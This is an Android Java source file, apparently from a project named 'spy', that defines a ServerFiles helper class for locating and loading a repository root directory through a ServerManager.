package com.gameofcoding.spy.server.files;

import android.content.Context;
import com.gameofcoding.spy.server.ServerManager;
import com.gameofcoding.spy.utils.Utils;
import com.gameofcoding.spy.utils.XLog;
import java.io.File;

/**
 * Helps in managing paths of different files within data files.
*/
public class ServerFiles implements Files {
    private static final String TAG = "ServerFiles";
    public static final String ROOT_DIR_NAME = "repoRootDir";
    private static ServerManager mServerManager;

    /** @hide */
    private ServerFiles() {}

    /**
     * Returns the object of this class
     */
    public static ServerFiles loadFiles(Context context) {
	if(context == null)
	    return null;
	File serverRootDir = new File(Utils.getFilesDir(context), ROOT_DIR_NAME);
	mServerManager = new ServerManager(context, serverRootDir);
	if(mServerManager.loadServer(true) != null)
	    return new ServerFiles();
	XLog.e(TAG, "Server dir could not be loaded, aborting and returning null.");
	return null;
    }
        
    /**
     * Returns the root directory of data files.
     */
    @Override
    public File getRootDir() {
	if(mServerManager == null)
	    return null;
	return mServerManager.getRepoRootDir();
    }
}
